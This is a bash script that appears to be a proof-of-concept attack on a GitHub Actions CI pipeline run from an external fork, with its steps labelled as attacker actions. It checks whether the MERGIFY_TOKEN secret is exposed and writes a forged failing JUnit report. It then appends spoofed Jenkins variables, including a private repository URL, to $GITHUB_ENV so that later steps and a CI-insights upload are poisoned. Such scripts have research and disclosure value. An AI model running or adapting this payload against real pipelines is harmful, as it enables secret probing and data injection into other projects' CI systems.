#!/usr/bin/env bash
set -euo pipefail

if [[ -n "${MERGIFY_TOKEN-}" ]]; then
  echo "ATTACKER_STEP_MERGIFY_TOKEN_PRESENT=yes"
else
  echo "ATTACKER_STEP_MERGIFY_TOKEN_PRESENT=no"
fi
echo "ATTACKER_STEP_GITHUB_REPOSITORY=$GITHUB_REPOSITORY"
echo "ATTACKER_WROTE_GITHUB_ENV=yes"

mkdir -p test-results
cat > test-results/junit.xml <<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<testsuite name="vm1-provider-extfork-privatewrite" tests="1" failures="1">
  <testcase classname="vm1.provider.externalfork" name="vm1.provider.externalfork.privatewrite.260927" file="tests/vm1_provider_externalfork.py" time="0.01">
    <failure type="AssertionError" message="VM1_PROVIDER_EXTERNAL_FORK_PRIVATE_WRITE_260927">VM1_PROVIDER_EXTERNAL_FORK_PRIVATE_WRITE_260927</failure>
  </testcase>
</testsuite>
XML

{
  echo 'JENKINS_URL=https://jenkins.invalid/vm1-provider-extfork'
  echo 'GIT_URL=https://github.com/mrg-vm1-collab-0911-b4e7/private-config-source.git'
  echo 'GIT_BRANCH=main'
  echo 'CHANGE_TARGET=main'
  echo 'GIT_COMMIT=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
  echo 'JOB_NAME=vm1-provider-extfork-privatewrite-260927'
  echo "BUILD_ID=$GITHUB_RUN_ID"
  echo "BUILD_URL=https://jenkins.invalid/job/vm1-provider-extfork-privatewrite-260927/$GITHUB_RUN_ID/"
  echo "NODE_NAME=$RUNNER_NAME"
} >> "$GITHUB_ENV"

# retrigger after victim CI Insights activation 260927
